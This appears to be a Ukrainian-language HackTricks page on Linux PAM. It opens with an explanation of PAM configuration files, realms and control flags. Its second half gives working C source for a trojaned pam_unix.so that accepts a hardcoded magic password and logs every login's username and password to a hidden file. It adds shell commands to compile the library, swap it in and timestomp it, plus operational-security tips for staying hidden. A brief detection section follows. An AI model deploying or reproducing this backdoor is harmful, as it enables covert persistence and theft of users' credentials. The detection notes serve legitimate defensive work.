# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** діє як механізм безпеки, який **перевіряє особу користувачів, які намагаються отримати доступ до комп'ютерних послуг**, контролюючи їх доступ на основі різних критеріїв. Це схоже на цифрового охоронця, який забезпечує, щоб лише авторизовані користувачі могли взаємодіяти з певними послугами, одночасно потенційно обмежуючи їх використання, щоб запобігти перевантаженню системи.

#### Файли конфігурації

- **Системи Solaris та UNIX** зазвичай використовують центральний файл конфігурації, розташований за адресою `/etc/pam.conf`.
- **Системи Linux** віддають перевагу підходу з директоріями, зберігаючи специфічні для послуг конфігурації в `/etc/pam.d`. Наприклад, файл конфігурації для служби входу знаходиться за адресою `/etc/pam.d/login`.

Приклад конфігурації PAM для служби входу може виглядати так:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ці області, або групи управління, включають **auth**, **account**, **password** та **session**, кожна з яких відповідає за різні аспекти процесу аутентифікації та управління сесіями:

- **Auth**: Підтверджує особу користувача, часто запитуючи пароль.
- **Account**: Обробляє перевірку облікового запису, перевіряючи умови, такі як членство в групі або обмеження за часом доби.
- **Password**: Керує оновленнями паролів, включаючи перевірки складності або запобігання атакам словником.
- **Session**: Керує діями під час початку або закінчення сесії служби, такими як монтування каталогів або встановлення обмежень ресурсів.

#### **PAM Module Controls**

Контролі визначають реакцію модуля на успіх або невдачу, впливаючи на загальний процес аутентифікації. До них відносяться:

- **Required**: Невдача обов'язкового модуля призводить до остаточної невдачі, але лише після перевірки всіх наступних модулів.
- **Requisite**: Негайне завершення процесу у разі невдачі.
- **Sufficient**: Успіх обходить решту перевірок того ж самого рівня, якщо наступний модуль не зазнає невдачі.
- **Optional**: Викликає невдачу лише якщо це єдиний модуль у стеку.

#### Example Scenario

У налаштуванні з кількома модулями auth процес слідує строгому порядку. Якщо модуль `pam_securetty` виявляє, що термінал для входу несанкціонований, вхід root блокується, але всі модулі все ще обробляються через його статус "required". Модуль `pam_env` встановлює змінні середовища, що потенційно покращує досвід користувача. Модулі `pam_ldap` та `pam_unix` працюють разом для аутентифікації користувача, причому `pam_unix` намагається використати раніше наданий пароль, підвищуючи ефективність і гнучкість методів аутентифікації.

## Backdooring PAM – Hooking `pam_unix.so`

Класичний трюк з постійністю в середовищах Linux високої вартості полягає в тому, щоб **замінити легітимну бібліотеку PAM на тройовану версію**. Оскільки кожен вхід через SSH / консоль в кінцевому підсумку викликає `pam_unix.so:pam_sm_authenticate()`, кілька рядків C достатньо, щоб захопити облікові дані або реалізувати *чарівний* обхід пароля.

### Compilation Cheatsheet
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
Скомпілювати та непомітно замінити:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – записати у тимчасовий файл і `mv` на місце, щоб уникнути частково записаних бібліотек, які можуть заблокувати SSH.
2. Розміщення лог-файлів, таких як `/usr/bin/.dbus.log`, зливається з легітимними артефактами робочого столу.
3. Зберігайте експорти символів ідентичними (`pam_sm_setcred` тощо), щоб уникнути неправильного поводження PAM.

### Detection
* Порівняйте MD5/SHA256 `pam_unix.so` з пакетом дистрибутива.
* Перевірте на наявність файлів, доступних для запису всім, або незвичну власність під `/lib/security/`.
* Правило `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.

### References

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
